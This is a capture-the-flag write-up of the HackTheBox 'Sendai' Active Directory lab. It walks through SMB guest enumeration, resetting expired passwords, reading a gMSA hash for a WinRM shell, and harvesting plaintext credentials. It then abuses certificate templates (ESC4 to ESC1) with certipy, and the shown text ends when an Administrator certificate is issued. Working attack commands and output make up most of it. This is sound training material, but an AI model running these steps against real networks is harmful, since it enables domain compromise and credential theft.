---
title: "HackTheBox - Sendai"
author: DrLi
description: "Writeup of a medium-rated Windows Active Directory machine from HackTheBox."
date: 2025-11-25 19:02:00 +0100
categories: [HackTheBox, Machines]
tags: [hackthebox, windows, medium, active directory, smb, password-expiration, gmsa, bloodhound, adcs, esc4, esc1, certificate abuse, certipy, evil-winrm, bloodyad, service-enumeration]
img_path: /assets/img/HackTheBox/Machines/Sendai
image:
    path: /assets/img/HackTheBox/Machines/Sendai/sendai.png
---

<div align="center"><script src="https://tryhackme.com/badge/2794771"></script></div>

---


### Enumeration

## nmap

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ nmap -T4 --min-rate 1000 -sV -sC -Pn -n -p- 10.129.172.213 -o nmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 07:59 EST
Nmap scan report for 10.129.172.213
Host is up (0.10s latency).
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-25 13:04:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
|_ssl-date: TLS randomness does not represent time
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: DNS:dc.sendai.vl
| Not valid before: 2023-07-18T12:39:21
|_Not valid after:  2024-07-18T00:00:00
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SENDAI
|   NetBIOS_Domain_Name: SENDAI
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sendai.vl
|   DNS_Computer_Name: dc.sendai.vl
|   DNS_Tree_Name: sendai.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-25T13:05:03+00:00
| ssl-cert: Subject: commonName=dc.sendai.vl
| Not valid before: 2025-11-24T12:55:53
|_Not valid after:  2026-05-26T12:55:53
|_ssl-date: 2025-11-25T13:05:42+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
50353/tcp open  msrpc         Microsoft Windows RPC
52929/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
52930/tcp open  msrpc         Microsoft Windows RPC
52947/tcp open  msrpc         Microsoft Windows RPC
52951/tcp open  msrpc         Microsoft Windows RPC
57726/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-25T13:05:06
|_  start_date: N/A
```

the web site only has the Default IIS page 

so nothing interesting we move on to enumerating SMB 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ nxc smb sendai.vl -u 'a' -p '' --shares
SMB         10.129.172.213  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.172.213  445    DC               [+] sendai.vl\a: (Guest)
SMB         10.129.172.213  445    DC               [*] Enumerated shares
SMB         10.129.172.213  445    DC               Share           Permissions     Remark
SMB         10.129.172.213  445    DC               -----           -----------     ------
SMB         10.129.172.213  445    DC               ADMIN$                          Remote Admin
SMB         10.129.172.213  445    DC               C$                              Default share
SMB         10.129.172.213  445    DC               config                          
SMB         10.129.172.213  445    DC               IPC$            READ            Remote IPC
SMB         10.129.172.213  445    DC               NETLOGON                        Logon server share 
SMB         10.129.172.213  445    DC               sendai          READ            company share
SMB         10.129.172.213  445    DC               SYSVOL                          Logon server share 
SMB         10.129.172.213  445    DC               Users           READ         
```

so guest logon is available and we can read two shares `sendai`and `Users`

in the Users share 

```bash
└─$ smbclient  -U '' //sendai.vl/Users              
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Tue Jul 11 05:58:27 2023
  ..                                DHS        0  Tue Apr 15 22:55:42 2025
  Default                           DHR        0  Tue Jul 11 12:36:32 2023
  desktop.ini                       AHS      174  Sat May  8 04:18:31 2021
  Public                             DR        0  Tue Jul 11 03:36:58 2023
```

it only had these so i moved to the other share

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ smbclient  -U '' //sendai.vl/Sendai
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 18 13:31:04 2023
  ..                                DHS        0  Tue Apr 15 22:55:42 2025
  hr                                  D        0  Tue Jul 11 08:58:19 2023
  incident.txt                        A     1372  Tue Jul 18 13:34:15 2023
  it                                  D        0  Tue Jul 18 09:16:46 2023
  legal                               D        0  Tue Jul 11 08:58:23 2023
  security                            D        0  Tue Jul 18 09:17:35 2023
  transfer                            D        0  Tue Jul 11 09:00:20 2023
```

in this share the only interesting file is `incident.txt`

which has

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ cat incident.txt    
Dear valued employees,

We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.

We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.

If you need assistance or have any questions regarding the password reset procedure, please don't hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.

Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.  
```

so some users had weak password and the accounts have been expired 

so when they login next they need to change their password 

first we need to get all users

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ nxc smb sendai.vl -u 'a' -p '' --rid-brute | grep 'SidTypeUser'
SMB                      10.129.172.213  445    DC               500: SENDAI\Administrator (SidTypeUser)
SMB                      10.129.172.213  445    DC               501: SENDAI\Guest (SidTypeUser)
SMB                      10.129.172.213  445    DC               502: SENDAI\krbtgt (SidTypeUser)
SMB                      10.129.172.213  445    DC               1000: SENDAI\DC$ (SidTypeUser)
SMB                      10.129.172.213  445    DC               1104: SENDAI\sqlsvc (SidTypeUser)
SMB                      10.129.172.213  445    DC               1105: SENDAI\websvc (SidTypeUser)
SMB                      10.129.172.213  445    DC               1108: SENDAI\Dorothy.Jones (SidTypeUser)
SMB                      10.129.172.213  445    DC               1109: SENDAI\Kerry.Robinson (SidTypeUser)
SMB                      10.129.172.213  445    DC               1110: SENDAI\Naomi.Gardner (SidTypeUser)
SMB                      10.129.172.213  445    DC               1111: SENDAI\Anthony.Smith (SidTypeUser)
SMB                      10.129.172.213  445    DC               1112: SENDAI\Susan.Harper (SidTypeUser)
SMB                      10.129.172.213  445    DC               1113: SENDAI\Stephen.Simpson (SidTypeUser)
SMB                      10.129.172.213  445    DC               1114: SENDAI\Marie.Gallagher (SidTypeUser)
SMB                      10.129.172.213  445    DC               1115: SENDAI\Kathleen.Kelly (SidTypeUser)
SMB                      10.129.172.213  445    DC               1116: SENDAI\Norman.Baxter (SidTypeUser)
SMB                      10.129.172.213  445    DC               1117: SENDAI\Jason.Brady (SidTypeUser)
SMB                      10.129.172.213  445    DC               1118: SENDAI\Elliot.Yates (SidTypeUser)
SMB                      10.129.172.213  445    DC               1119: SENDAI\Malcolm.Smith (SidTypeUser)
SMB                      10.129.172.213  445    DC               1120: SENDAI\Lisa.Williams (SidTypeUser)
SMB                      10.129.172.213  445    DC               1121: SENDAI\Ross.Sullivan (SidTypeUser)
SMB                      10.129.172.213  445    DC               1122: SENDAI\Clifford.Davey (SidTypeUser)
SMB                      10.129.172.213  445    DC               1123: SENDAI\Declan.Jenkins (SidTypeUser)
SMB                      10.129.172.213  445    DC               1124: SENDAI\Lawrence.Grant (SidTypeUser)
SMB                      10.129.172.213  445    DC               1125: SENDAI\Leslie.Johnson (SidTypeUser)
SMB                      10.129.172.213  445    DC               1126: SENDAI\Megan.Edwards (SidTypeUser)
SMB                      10.129.172.213  445    DC               1127: SENDAI\Thomas.Powell (SidTypeUser)
SMB                      10.129.172.213  445    DC               1130: SENDAI\mgtsvc$ (SidTypeUser)
```

now we should try the users with a blank password to identify which accounts had the weak password

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ nxc smb sendai.vl -u users.txt -p '' --no-brute --continue-on-success
SMB         10.129.172.213  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.172.213  445    DC               [-] sendai.vl\Administrator: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\krbtgt: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [+] sendai.vl\Guest: 
SMB         10.129.172.213  445    DC               [-] sendai.vl\sqlsvc: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\websvc: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Dorothy.Jones: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Kerry.Robinson: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Naomi.Gardner: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Anthony.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Susan.Harper: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Stephen.Simpson: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Marie.Gallagher: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Kathleen.Kelly: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Norman.Baxter: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Jason.Brady: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Malcolm.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Lisa.Williams: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Ross.Sullivan: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Clifford.Davey: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Declan.Jenkins: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Lawrence.Grant: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Leslie.Johnson: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Megan.Edwards: STATUS_LOGON_FAILURE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.172.213  445    DC               [-] sendai.vl\mgtsvc$: STATUS_LOGON_FAILURE 
```

so both `Thomas.Powell` and `Elliot.Yates` need to change their password for the next logon 

let’s change Thomas’s password

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ impacket-changepasswd sendai.vl/Thomas.Powell@10.129.172.213 -newpass 'NewPassword123!'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Current password: 
[*] Changing the password of sendai.vl\Thomas.Powell
[*] Connecting to DCE/RPC as sendai.vl\Thomas.Powell
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.
```

now looking at bloodhound Data we can see this

![image.png](/assets/img/HackTheBox/Machines/Sendai/image.png)

we have `GenericAll`over the group `ADMSVC` which means we can add our self to it

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ bloodyAD --host 10.129.172.213 -d sendai.vl -u Thomas.Powell -p 'NewPassword123!' add groupMember ADMSVC Thomas.Powell
[+] Thomas.Powell added to ADMSVC
```

and this group has this

![image.png](/assets/img/HackTheBox/Machines/Sendai/image1.png)

now we can read the password for this service machine account and get access to WinRM because the machine is part of the remote management group

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ nxc ldap sendai.vl -u Thomas.Powell -p 'NewPassword123!' --gmsa
LDAP        10.129.172.213  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)
LDAPS       10.129.172.213  636    DC               [+] sendai.vl\Thomas.Powell:NewPassword123! 
LDAPS       10.129.172.213  636    DC               [*] Getting GMSA Passwords
LDAPS       10.129.172.213  636    DC               Account: mgtsvc$              NTLM: 294a68fb0bf5c724bcbc58a9bf50db0e     PrincipalsAllowedToReadPassword: admsvc                                                                    
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ evil-winrm -i sendai.vl -u 'mgtsvc$' -H '294a68fb0bf5c724bcbc58a9bf50db0e'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mgtsvc$\desktop> cd c:\
*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        11/25/2025   7:10 AM                config
d-----         4/15/2025   8:20 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         4/15/2025   7:51 PM                Program Files
d-----         7/18/2023   6:11 AM                Program Files (x86)
d-----        11/25/2025   7:10 AM                sendai
d-----         7/11/2023   2:35 AM                SQL2019
d-r---        11/25/2025   9:29 AM                Users
d-----         8/18/2025   5:04 AM                Windows
-a----         4/15/2025   8:27 PM             32 user.txt

*Evil-WinRM* PS C:\> cat user.txt
fff335936142d21a6fa44123b897cd3e
```

### Privilege Escalation

after enumerating the machine very well to find any other credentials or any path to Domain admin 

i was able to find the password for the `sqlsvc` user 

```bash
*Evil-WinRM* PS C:\Users\mgtsvc$> cd c:\
*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        11/25/2025   7:10 AM                config
d-----         4/15/2025   8:20 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         4/15/2025   7:51 PM                Program Files
d-----         7/18/2023   6:11 AM                Program Files (x86)
d-----        11/25/2025   7:10 AM                sendai
d-----         7/11/2023   2:35 AM                SQL2019
d-r---        11/25/2025   9:29 AM                Users
d-----         8/18/2025   5:04 AM                Windows
-a----         4/15/2025   8:27 PM             32 user.txt

*Evil-WinRM* PS C:\> cd config
*Evil-WinRM* PS C:\config> ls

    Directory: C:\config

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/11/2023   5:57 AM             78 .sqlconfig

```

this file has

```bash
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;
```

but the sqlsvc user has nothing interesting no shares no privileges 

so i went back and continued enumerating from WinRM

so i mapped the configuration that Windows uses for services registered in the SCM

```bash
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> dir -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | select-string -NotMatch "svchost.exe" | select-string "exe"

@{ImagePath=C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe}
@{ImagePath=C:\Windows\System32\alg.exe}
@{ImagePath="C:\Program Files\Amazon\EC2Launch\service\EC2LaunchService.exe"}
@{ImagePath="C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"}
@{ImagePath=C:\Windows\system32\AppVClient.exe}
@{ImagePath=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe}
@{ImagePath="C:\Program Files\Amazon\XenTools\LiteAgent.exe"}
@{ImagePath=C:\Windows\System32\lsass.exe}
@{ImagePath=System32\Drivers\ExecutionContext.sys}
@{ImagePath=C:\Windows\Microsoft.Net\Framework64\v3.0\WPF\PresentationFontCache.exe}
@{ImagePath=C:\Windows\System32\ismserv.exe}
@{ImagePath=C:\Windows\System32\lsass.exe}
@{ImagePath=C:\Windows\system32\lsass.exe}
@{ImagePath=C:\Windows\System32\OpenSSH\ssh-agent.exe}
@{ImagePath=C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs}
@{ImagePath=C:\Windows\system32\TieringEngineService.exe}
```

and we found another set of credentials and this user is a member of the `CA operators` Group

![image.png](/assets/img/HackTheBox/Machines/Sendai/image2.png)

so maybe we can use him to enumerate for ADCS stuff

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ certipy find -vulnerable -u clifford.davey@sendai.vl -p 'RFmoB2WplgE_3p' -dc-ip 10.129.172.213 -target dc.sendai.vl -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sendai-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sendai-DC-CA'
[*] Checking web enrollment for CA 'sendai-DC-CA' @ 'dc.sendai.vl'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sendai-DC-CA
    DNS Name                            : dc.sendai.vl
    Certificate Subject                 : CN=sendai-DC-CA, DC=sendai, DC=vl
    Certificate Serial Number           : 326E51327366FC954831ECD5C04423BE
    Certificate Validity Start          : 2023-07-11 09:19:29+00:00
    Certificate Validity End            : 2123-07-11 09:29:29+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SENDAI.VL\Administrators
      Access Rights
        ManageCa                        : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        ManageCertificates              : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        Enroll                          : SENDAI.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : SendaiComputer
    Display Name                        : SendaiComputer
    Certificate Authorities             : sendai-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-11T12:46:12+00:00
    Template Last Modified              : 2023-07-11T12:46:19+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SENDAI.VL\Administrator
        Full Control Principals         : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Owner Principals          : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Dacl Principals           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Property Enroll           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
    [+] User Enrollable Principals      : SENDAI.VL\Domain Computers
                                          SENDAI.VL\ca-operators
    [+] User ACL Principals             : SENDAI.VL\ca-operators
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```

OK so we have some dangerous permissions over the template which is known as ESC4

here a blog on how to exploit it:https://medium.com/r3d-buck3t/adcs-attack-series-abusing-esc4-via-template-acls-for-privilege-escalation-98320f0da59a

so basically you change the template permissions to be vulnerable to other stuff like ESC1

here are the steps 

first save the template to return it as it was when you are done

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ certipy template -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -template SendaiComputer -dc-ip 10.129.172.213 -save-configuration ESC4-original 

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'ESC4-original.json'
[*] Wrote current configuration for 'SendaiComputer' to 'ESC4-original.json'
```

now we need to make the template vulnerable to ESC1 which we can do using certipy flag `-write-default-configuration` 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ certipy template -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -template SendaiComputer -dc-ip 10.129.172.213 -write-default-configuration

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'SendaiComputer.json'
[*] Wrote current configuration for 'SendaiComputer' to 'SendaiComputer.json'
[*] Updating certificate template 'SendaiComputer'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Minimal-Key-Size: 2048
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
[*] Successfully updated 'SendaiComputer'
```

if we check now the template we can see the changes

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ certipy find -vulnerable -u clifford.davey@sendai.vl -p 'RFmoB2WplgE_3p' -dc-ip 10.129.172.213 -target dc.sendai.vl -stdout                         
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sendai-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sendai-DC-CA'
[*] Checking web enrollment for CA 'sendai-DC-CA' @ 'dc.sendai.vl'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sendai-DC-CA
    DNS Name                            : dc.sendai.vl
    Certificate Subject                 : CN=sendai-DC-CA, DC=sendai, DC=vl
    Certificate Serial Number           : 326E51327366FC954831ECD5C04423BE
    Certificate Validity Start          : 2023-07-11 09:19:29+00:00
    Certificate Validity End            : 2123-07-11 09:29:29+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SENDAI.VL\Administrators
      Access Rights
        ManageCa                        : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        ManageCertificates              : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        Enroll                          : SENDAI.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : SendaiComputer
    Display Name                        : SendaiComputer
    Certificate Authorities             : sendai-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-07-11T12:46:12+00:00
    Template Last Modified              : 2025-11-25T19:45:39+00:00
    Permissions
      Object Control Permissions
        Owner                           : SENDAI.VL\Administrator
        Full Control Principals         : SENDAI.VL\Authenticated Users
        Write Owner Principals          : SENDAI.VL\Authenticated Users
        Write Dacl Principals           : SENDAI.VL\Authenticated Users
    [+] User Enrollable Principals      : SENDAI.VL\Authenticated Users
    [+] User ACL Principals             : SENDAI.VL\Authenticated Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.
```

now we can exploit ESC1 which is basically just impersonating a Domain Admin

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Sendai]
└─$ certipy -debug req -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -template SendaiComputer -ca 'sendai-DC-CA' -dc-ip 10.129.172.213 -dc-host dc.sendai.vl -target dc.sendai.vl  -upn administrator@sendai.vl -sid S-1-5-21-3085872742-570972823-736764132-500
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.129.172.213'
[+] DC IP: '10.129.172.213'
[+] DC Host: 'dc.sendai.vl'
[+] Target IP: None
[+] Remote Name: 'dc.sendai.vl'
[+] Domain: 'SENDAI.VL'
[+] Username: 'CLIFFORD.DAVEY'
[+] Trying to resolve 'dc.sendai.vl' at '10.129.172.213'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.172.213[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.172.213[\pipe\cert]
[*] Request ID is 8
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sendai.vl'
[+] Found SID in SAN URL: 'S-1-5-21-3085872742-570972823-736764132-500'
[+] Found SID in security extension: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Certificate object SID is 'S-1-5-21-3085872742-570972823-736764132-500'
